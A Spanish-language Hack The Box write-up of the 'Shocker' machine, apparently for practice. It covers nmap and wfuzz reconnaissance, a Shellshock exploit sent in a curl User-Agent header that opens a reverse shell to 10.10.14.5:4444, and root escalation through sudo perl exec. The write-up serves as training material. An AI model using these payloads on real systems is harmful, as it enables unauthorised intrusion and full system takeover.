![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/shocker.jpg)

## Linux - Easy
IP = 10.10.10.56

### USER ###

*** 
Ejecutamos nmap 
    
    nmap 10.10.10.56 -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts
    
![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/allPorts.jpg)

    nmap 10.10.10.56 -sC -sV -p80  -oN targeted

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/targeted.jpg)

Detectamos un Apache
Revisamos la pagina web y no vemos nada

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/pagina.jpg)

realizamos un scaneo de directorios en busca de algo mas de información

    wfuzz -c -t 200 --hh=137 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://10.10.10.56/FUZZ/

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/wfuzz.jpg)

Vemos que hay un par de directorios cgi-bin e icons.
Investigamos un poco y vemos que en el directorio cgi-bin se guardan script para que ejecute apache, volvemos a ejeutar wfuzz para que busque dentro de los directorios que encuentre ficheros con varias extensiones posibles. 
-.sh
-.py
-.cgi
-.pl

[](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/extension.jpg)

    wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -w extensions.txt http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/wfuzz2.jpg)

Encontramos user.sh y vemos su contenido.

    curl http://10.10.10.56/cgi-bin/user.sh

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/curl.jpg)

Investigamos sobre exploit apache cgi y encontramos una vulnerabilidad RCE

https://www.exploit-db.com/exploits/34900

y procedemos a explotarla.

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/shellsock.jpg)

vemos que el servidores es vulnerable a shellsock por lo que vamos a crear un remote shell

maquina local 

    nc -lvp 4444

maquina victima 
    
    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" http://10.10.10.56/cgi-bin/user.sh

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/remoteshell.jpg)

Vemos que el usuario con el que hemos conectado es shelly, vamos a su home y abrimos user.txt

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/userflag.jpg)

Para la escalada de privilegios ejecutamos sudo -l

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/sudol.jpg)

vemos que podemos ejecutar /usr/bin/perl con root sin password.
Ejecutamos el siguiente comando

    sudo /usr/bin/perl -e 'exec "/bin/sh"'

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/root.jpg)

Entramos en el directorio de root y abrimos la flag

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/rootFlag.jpg)

